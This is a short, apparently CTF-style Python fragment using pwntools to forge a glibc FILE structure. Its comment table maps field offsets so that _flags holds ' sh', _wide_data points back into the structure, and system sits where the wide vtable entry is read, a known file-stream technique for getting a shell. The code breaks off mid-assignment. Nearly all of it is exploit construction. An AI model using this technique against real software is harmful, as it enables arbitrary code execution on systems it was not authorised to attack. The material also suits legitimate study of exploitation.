from pwn import *

# Offset	Field	Value	Comment
# 0	_flags	" sh\0"	
# 8	_IO_read_ptr	0	_wide_data->_IO_write_base
# …		
# 32	_IO_write_base	0	_wide_data->_IO_buf_base
# …		
# 160	_wide_data	fp - 16	
# …		
# 200	_unused2[4]	system	[_wide_data->_wide_vtable + 0x68]
# 208	_unused2[12]	_markers	_wide_data->_wide_vtable

fileStr = FileStructure(null = 0xdeadbeef)
fileStr._flags = b' sh\x00'
fileStr._IO_read_ptr = 0
fileStr._IO_write_base = 0

fileStr._unused2[4] = 